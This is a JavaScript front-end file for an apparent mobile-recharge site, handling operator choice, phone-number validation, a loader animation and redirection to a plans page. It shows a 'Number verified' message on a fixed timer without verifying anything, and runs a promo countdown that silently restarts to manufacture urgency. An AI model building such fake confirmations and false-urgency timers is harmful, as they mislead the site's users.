/**
 * SwiftRecharge - Application Logic & Animations
 */

(function () {
  'use strict';

  var operatorTiles = document.querySelectorAll('.operator-option');
  var mobileInput = document.getElementById('mobileNumber');
  var mobileField = document.getElementById('mobileField');
  var inputMessage = document.getElementById('inputMessage');
  var rechargeButton = document.getElementById('rechargeButton');
  var loaderOverlay = document.getElementById('loaderOverlay');
  var loaderCard = document.getElementById('loaderCard');
  var loadingAnimation = document.getElementById('loadingAnimation');
  var successAnimation = document.getElementById('successAnimation');
  var loaderText = document.getElementById('loaderText');
  var loaderSubText = document.getElementById('loaderSubText');
  var formMobile = document.getElementById('fMobile');
  var formOperator = document.getElementById('fOperator');

  // 1. Shared Countdown Timer
  function initPromoTimer() {
    var timerKey = 'swift_rc_timer_end';
    var durationMs = 10 * 60 * 1000;
    var endTime = localStorage.getItem(timerKey);

    if (!endTime || isNaN(endTime) || parseInt(endTime) < Date.now()) {
      endTime = Date.now() + durationMs;
      localStorage.setItem(timerKey, endTime);
    } else {
      endTime = parseInt(endTime);
    }

    var timerEl = document.getElementById('time');
    if (!timerEl) return;

    function updateTick() {
      var remaining = endTime - Date.now();
      if (remaining <= 0) {
        timerEl.textContent = '00:00';
        return;
      }
      var mins = Math.floor(remaining / 60000);
      var secs = Math.floor((remaining % 60000) / 1000);
      timerEl.textContent =
        String(mins).padStart(2, '0') + ':' + String(secs).padStart(2, '0');
    }

    updateTick();
    setInterval(updateTick, 1000);
  }

  // 2. Operator Selection
  operatorTiles.forEach(function (tile) {
    tile.addEventListener('click', function () {
      operatorTiles.forEach(function (item) {
        item.classList.remove('selected');
        item.setAttribute('aria-pressed', 'false');
      });
      tile.classList.add('selected');
      tile.setAttribute('aria-pressed', 'true');

      var radioId = tile.getAttribute('data-radio');
      var radio = document.getElementById(radioId);
      if (radio) {
        radio.checked = true;
      }

      var op = tile.getAttribute('data-operator');
      if (formOperator) {
        formOperator.value = op;
      }
      sessionStorage.setItem('swift_operator', op);

      if (navigator.vibrate) {
        navigator.vibrate(12);
      }
    });
  });

  // 3. Mobile Number Validation & Formatting
  function getDigits(v) {
    return String(v || '').replace(/\D/g, '').slice(0, 10);
  }

  function formatMobile(d) {
    return d.length <= 5 ? d : d.slice(0, 5) + ' ' + d.slice(5);
  }

  function clearMobileError() {
    if (mobileField) {
      mobileField.classList.remove('invalid', 'shake');
    }
    if (inputMessage) {
      inputMessage.textContent = '';
    }
  }

  function showMobileError(msg) {
    if (!mobileField) return;
    mobileField.classList.remove('shake');
    if (inputMessage) {
      inputMessage.textContent = msg;
    }
    // Force reflow for shake animation replay
    void mobileField.offsetWidth;
    mobileField.classList.add('invalid', 'shake');
    if (navigator.vibrate) {
      navigator.vibrate([35, 30, 35]);
    }
  }

  if (mobileInput) {
    // Populate saved number if any
    var urlParams = new URLSearchParams(window.location.search);
    var savedMobile = urlParams.get('mobile') || sessionStorage.getItem('swift_mobile');
    if (savedMobile && /^\d{10}$/.test(savedMobile)) {
      mobileInput.value = formatMobile(savedMobile);
      if (formMobile) formMobile.value = savedMobile;
    }

    mobileInput.addEventListener('input', function () {
      var digits = getDigits(this.value);
      this.value = formatMobile(digits);
      if (mobileField && mobileField.classList.contains('invalid')) {
        clearMobileError();
      }
      if (formMobile) {
        formMobile.value = digits;
      }
    });

    mobileInput.addEventListener('focus', function () {
      if (mobileField) {
        mobileField.classList.remove('shake');
      }
    });

    mobileInput.addEventListener('keydown', function (e) {
      if (e.key === 'Enter') {
        e.preventDefault();
        if (rechargeButton) rechargeButton.click();
      }
    });
  }

  function getSelectedOperator() {
    var checked = document.querySelector('input[name="operator"]:checked');
    if (checked && checked.value) return checked.value;
    var selected = document.querySelector('.operator-option.selected');
    return selected ? selected.getAttribute('data-operator') : 'jio';
  }

  // 4. Two-Phase Loader & Navigation Animation
  var navTimer = null;
  var redirecting = false;

  function showLoaderSuccess() {
    if (loaderCard) loaderCard.classList.add('success');
    if (loadingAnimation) loadingAnimation.style.display = 'none';
    if (successAnimation) successAnimation.style.display = 'flex';
    if (loaderText) {
      loaderText.textContent = 'Number verified';
      loaderText.style.color = '#16a34a';
    }
    if (loaderSubText) {
      loaderSubText.textContent = 'Loading available recharge plans…';
    }
    if (navigator.vibrate) {
      navigator.vibrate(25);
    }
  }

  function goToPlans(digits) {
    if (redirecting) return;
    redirecting = true;

    var operator = getSelectedOperator();
    sessionStorage.setItem('swift_mobile', digits);
    sessionStorage.setItem('swift_operator', operator);

    var targetUrl =
      'plans.html?mobile=' +
      encodeURIComponent(digits) +
      '&operator=' +
      encodeURIComponent(operator);

    window.location.assign(targetUrl);
  }

  if (rechargeButton) {
    rechargeButton.addEventListener('click', function () {
      if (navTimer) clearTimeout(navTimer);
      redirecting = false;

      var digits = getDigits(mobileInput ? mobileInput.value : '');
      if (digits.length !== 10) {
        showMobileError('Please enter a valid 10-digit mobile number');
        if (mobileInput) mobileInput.focus({ preventScroll: true });
        return;
      }

      if (!/^[6-9]/.test(digits)) {
        showMobileError('Valid mobile number starts with 6, 7, 8, or 9');
        if (mobileInput) mobileInput.focus({ preventScroll: true });
        return;
      }

      clearMobileError();
      rechargeButton.disabled = true;

      // Phase 1: Show spinner loader
      if (loaderOverlay) {
        loaderOverlay.classList.add('show');
      }

      // Phase 2: Show success verification checkmark at 700ms
      setTimeout(showLoaderSuccess, 700);

      // Phase 3: Navigate to plans at 1300ms
      navTimer = setTimeout(function () {
        goToPlans(digits);
      }, 1300);
    });
  }

  // Restore on back navigation
  window.addEventListener('pageshow', function () {
    if (navTimer) clearTimeout(navTimer);
    redirecting = false;
    if (rechargeButton) rechargeButton.disabled = false;
    if (loaderOverlay) loaderOverlay.classList.remove('show');
    if (loaderCard) loaderCard.classList.remove('success');
    if (loadingAnimation) loadingAnimation.style.display = 'flex';
    if (successAnimation) successAnimation.style.display = 'none';
    if (loaderText) {
      loaderText.textContent = 'Please wait';
      loaderText.style.color = '#111827';
    }
    if (loaderSubText) {
      loaderSubText.textContent = 'Loading available recharge plans…';
    }
    clearMobileError();
  });

  initPromoTimer();
})();
